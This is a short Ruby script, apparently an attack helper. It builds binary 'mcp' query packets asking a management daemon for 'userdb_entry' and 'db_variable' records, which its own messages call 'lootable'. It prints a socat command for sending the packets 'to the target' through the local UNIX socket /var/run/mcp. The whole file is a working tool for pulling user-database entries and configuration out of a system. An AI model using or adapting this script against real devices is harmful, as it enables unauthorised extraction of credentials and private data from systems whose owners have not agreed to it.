require './mcp-builder.rb'

if ARGV.length > 0
  LOOTABLE = ARGV
  $stderr.puts("Writing an `mcp` message to stdout that'll query for your requests: #{ LOOTABLE.join(', ') }")
else
  LOOTABLE = ['userdb_entry', 'db_variable']
  $stderr.puts("Writing an `mcp` message to stdout that'll query for interesting stuff: #{ LOOTABLE.join(', ') }")
end

$stderr.puts("Send it to the target using: socat -t100 - UNIX-CONNECT:/var/run/mcp < mcpmessage.bin")
$stderr.puts

LOOTABLE.each do |l|
  print build_packet(
    build('query_all', 'structure', [
      build(l, 'structure', [])
    ])
  )
end
